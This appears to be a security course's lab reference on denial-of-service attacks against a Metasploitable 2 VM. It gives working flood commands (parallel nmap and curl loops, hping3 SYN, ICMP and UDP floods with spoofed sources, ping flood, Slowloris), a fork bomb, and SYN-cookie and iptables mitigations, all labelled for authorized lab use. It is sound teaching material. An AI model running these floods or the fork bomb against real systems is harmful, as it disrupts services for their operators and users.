# 06. Denial of Service — Commands & Code Examples

### Find the victim VM's IP address
**What:** On Metasploitable 2, get its IP so you can target it from Kali.
```bash
ifconfig
```
**Notes:** Lab uses Metasploitable 2 as victim, Kali as attacker, both on the same NAT/Host-Only virtual network (E06 Environment Setup). The IP you read here replaces `<METASPLOITABLE IP>` in every command below. On Kali you can also use `ip addr` if `ifconfig` is missing. Authorized lab use only — the only legitimate target is your own deliberately vulnerable VM.

### Take a baseline reading with top
**What:** Observe CPU/memory and running services BEFORE any attack, for comparison.
```bash
top
```
**Notes:** Run inside Metasploitable 2 (E06 Task 1). Record CPU usage, Memory usage, and the services Apache, Tomcat, vsftpd, MySQL. Watch the `id` (Idle) and `si` (Software Interrupt) figures — these are the columns that move under stress. Press `q` to quit `top`. Every later stress test is judged against this baseline.

### List listening services on the victim
**What:** Enumerate which TCP/UDP services are accepting connections.
```bash
netstat -tulnp
```
**Notes:** `-t` TCP, `-u` UDP, `-l` listening only, `-n` numeric (no DNS lookups), `-p` show owning PID/program (E06 Task 1). Confirms Apache (80), MySQL (3306), etc. are up so you know what you can flood. On modern systems `ss -tulnp` is the faster replacement for `netstat`.

### Port-scan the victim to stress the network stack
**What:** Full TCP scan from Kali — thousands of inbound SYNs exhaust kernel connection handling.
```bash
nmap -T4 -p- <METASPLOITABLE IP>
```
**Notes:** `-T4` = aggressive timing, `-p-` = all 65,535 ports (E06 Task 2). On the victim's `top`, watch Idle (`id`) fall and Software Interrupt (`si`) rise, plus slower terminal response and Apache/Tomcat spikes. This stresses the network stack (connection-table work), not the application. Authorized lab use only.

### Amplify the scan with parallel jobs
**What:** Launch 10 simultaneous full scans to push degradation further.
```bash
for i in {1..10}; do nmap -T4 -p- <METASPLOITABLE IP> & done
```
**Notes:** The trailing `&` backgrounds each scan so all 10 run at once (E06 Task 2). Degradation in the victim's `top` should be markedly worse. Stop them with `pkill nmap`. This is a resource-exhaustion demo, not a classic Layer-4 attack — authorized lab use only.

### Confirm the web service responds, then HTTP-flood it
**What:** Single curl to verify, then 200 parallel requests to exhaust Apache workers.
```bash
curl http://<METASPLOITABLE IP>/
for i in {1..200}; do curl -s http://<METASPLOITABLE IP>/ >/dev/null & done
```
**Notes:** `-s` silences progress, `>/dev/null` discards the body, `&` backgrounds each request (E06 Task 3). This is a Layer-7 / application-layer stress (L06 p.23) — it overloads Apache worker processes, not just the network stack. On the victim watch worker count climb and `curl` start to time out. Scale to `{1..500}` for a stronger variant. Stop with `pkill curl`.

### Stop the network/HTTP floods
**What:** Kill all running attack processes by name.
```bash
pkill nmap
pkill curl
```
**Notes:** A flood only works while sustained — "the flood must be sustained" (L06 p.35) — so killing the generators lets the victim recover, proving the point. Use `pkill -f <pattern>` if the process name alone doesn't match.

### Exhaust CPU and disk I/O from inside the victim
**What:** Run 20 parallel CPU+I/O-heavy jobs ON Metasploitable 2 itself.
```bash
for i in {1..20}; do cat /dev/urandom | md5sum & done
```
**Notes:** Load is generated internally on the victim, not from Kali (E06 Task 4). Watch `top` for CPU/I/O saturation, rising software interrupts, I/O wait, and processes entering **D-state** (uninterruptible sleep). Stop with `pkill md5sum`. Authorized lab use only — runs on a disposable VM.

### Freeze the system with a fork bomb (DANGER)
**What:** A self-replicating shell function that exhausts the process table and freezes the host.
```bash
:(){ :|:& };:
```
**Notes:** SAFETY: this WILL freeze the VM and requires a hard reset (E06 Task 5) — run ONLY on a disposable VM you can power-cycle, never on any shared or production host. Reading it: `:()` defines a function named `:`; `{ :|:& }` pipes one copy of itself into another and backgrounds it; the final `:` invokes it, recursing until PIDs run out. The classic resource-exhaustion DoS against the process-table bottleneck.

### Inspect Apache logs for flood evidence
**What:** Look at the web-server logs to see whether/how the HTTP flood appears.
```bash
cat /var/log/apache2/access.log
cat /var/log/apache2/error.log
```
**Notes:** On Metasploitable 2 after Task 3 (E06 §6). Look for unusual or repeated entries showing service stress. Ties to the lecture's brute-force note that noisy attacks "flood a good system's logs" (L06 p.49). Use `tail -f /var/log/apache2/access.log` to watch entries arrive live during an attack.

### SYN flood with hping3 (standard syntax)
**What:** Flood a target's TCP port with SYNs and never complete the handshake.
```bash
sudo hping3 --flood -S -p 80 --rand-source <TARGET IP>
```
**Notes:** (standard syntax) `--flood` = send as fast as possible (no replies shown), `-S` = set SYN flag, `-p 80` = destination port, `--rand-source` = randomise source IP to evade simple filtering and hide the origin. Exploits the TCP 3-way handshake and fills the half-open connection buffer (L06 p.26). NOTE: the lecture/lab do NOT provide this command — SYN flood is conceptual (L06 p.26) and only suggested as a build-it-yourself extension (E06 §8). Authorized lab use only.

### ICMP and UDP floods with hping3 (standard syntax)
**What:** Volumetric floods over ICMP or UDP to saturate bandwidth/processing.
```bash
sudo hping3 --flood -1 <TARGET IP>            # ICMP flood (-1 = ICMP mode)
sudo hping3 --flood -2 -p 53 <TARGET IP>      # UDP flood (-2 = UDP mode, port 53)
```
**Notes:** (standard syntax) `-1` selects ICMP mode, `-2` selects UDP mode, `--flood` sends with no rate limit. These are the bread-and-butter volumetric floods that tools like LOIC (TCP/UDP/ICMP) and TFN (SYN/UDP + Smurf) automate (L06 p.37, p.40). Authorized lab use only.

### Classic ping flood (standard syntax)
**What:** Built-in `ping` flood — sends ICMP echo requests as fast as they return.
```bash
sudo ping -f <TARGET IP>
```
**Notes:** (standard syntax) `-f` = flood mode; requires root. Prints a `.` per packet sent and a backspace per reply, so a growing line of dots signals the target can't keep up. A primitive volumetric ICMP DoS. Authorized lab use only.

### Slowloris low-bandwidth Layer-7 attack (standard syntax)
**What:** Hold many connections open with partial HTTP requests to exhaust the socket pool.
```bash
slowloris <TARGET IP> -p 80 -s 500
```
**Notes:** (standard syntax) `-p 80` target port, `-s 500` = number of sockets to keep open. The only Layer-7 tool in the lecture's list (L06 p.42): it opens many connections and keeps them alive with incomplete headers, tying up Apache's sockets at near-zero bandwidth — do NOT describe it as a volumetric flood. Originally a 2009 Perl script, also a Python implementation (e.g. `pip install slowloris`). Authorized lab use only.

### Apache Bench HTTP load test (standard syntax)
**What:** Generate a controlled burst of HTTP requests to stress the web server.
```bash
ab -n 10000 -c 500 http://<TARGET IP>/
```
**Notes:** (standard syntax) `-n 10000` = total requests, `-c 500` = concurrent requests at a time. `ab` is the standard benchmarking counterpart to the lab's `curl` loop (E06 Task 3) and demonstrates Apache worker exhaustion. The trailing `/` (a path) is required or `ab` errors. Authorized lab use only.

### Observe SYN-flood impact via half-open connections
**What:** Count TCP connections stuck in the SYN_RECV (half-open) state on the victim.
```bash
netstat -an | grep SYN_RECV | wc -l
```
**Notes:** A SYN flood leaves many connections in `SYN_RECV` — the half-open buffer filling up (L06 p.26). A rising count is the signature. Modern equivalent: `ss -tan state syn-recv | wc -l`. Once the buffer is full the server "cannot react to valid connection attempts" (L06 p.26).

### Summarise socket states under load
**What:** Quick one-line summary of all TCP socket states (and totals).
```bash
ss -s
```
**Notes:** `ss -s` prints socket summary stats (total, TCP estab, closed, synrecv, timewait, etc.). A spike in `synrecv` points to a SYN flood; a spike in established/timewait points to an HTTP flood. Faster and more accurate than `netstat` on busy systems.

### Watch live CPU/process load during an attack
**What:** Real-time view of the resource being exhausted.
```bash
top
```
**Notes:** The primary observation tool throughout the lab (E06 Tasks 1–4). Under stress watch: falling Idle (`id`), rising Software Interrupt (`si`) and I/O wait (`wa`), climbing load average, Apache worker processes multiplying, and processes in D-state. Press `1` to see per-core CPU, `q` to quit.

### Enable SYN cookies to mitigate a SYN flood
**What:** Turn on SYN cookies so the kernel stops allocating buffer for half-open connections.
```bash
sudo sysctl -w net.ipv4.tcp_syncookies=1
```
**Notes:** SYN cookies encode the connection state into the SYN-ACK sequence number instead of consuming the half-open buffer; the client's returning ACK reconstructs it (L06 p.31). The real fix for the SYN-flood bottleneck — unlike stack tweaking, which "delays the effect, but is not fixing the bottleneck" (L06 p.31). Persist it in `/etc/sysctl.conf` (`net.ipv4.tcp_syncookies = 1`) so it survives reboot.

### Stack-tweak the SYN backlog and ACK timeout
**What:** OS tuning to buy time against a SYN flood — bigger backlog, fewer retries.
```bash
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096
sudo sysctl -w net.ipv4.tcp_synack_retries=2
```
**Notes:** Increase the half-open buffer (`tcp_max_syn_backlog`) and shorten how long the kernel waits for the final ACK by reducing SYN-ACK retries (L06 p.31). EXAM GOTCHA: stack tweaking only **delays** the effect — it does NOT fix the bottleneck (L06 p.31, Gotchas). Always pair it with SYN cookies for the actual mitigation.

### iptables: rate-limit incoming SYNs
**What:** Firewall rule to throttle new TCP connections, blunting a SYN/connection flood.
```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 25/second --limit-burst 50 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```
**Notes:** `--syn` matches connection-opening packets; `-m limit --limit 25/s --limit-burst 50` accepts up to a burst of 50 then 25/s; the second rule DROPs the rest. "Simple firewall rules help against a uniform attack pattern" (L06 p.35). Order matters — the ACCEPT must precede the DROP.

### iptables: filter ICMP and UDP floods
**What:** Drop or rate-limit ICMP/UDP, which stops some LOIC-style floods.
```bash
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
sudo iptables -A INPUT -p udp --dport 53 -j DROP
```
**Notes:** The lecture states "filtering ICMP and UDP ports prevents some LOIC DDoS attacks" (L06 p.32) — LOIC does TCP/UDP/ICMP flooding (L06 p.37). Rate-limit echo-requests rather than dropping all ICMP if you still need ping/path-MTU. Authorized lab/defensive use on systems you administer.
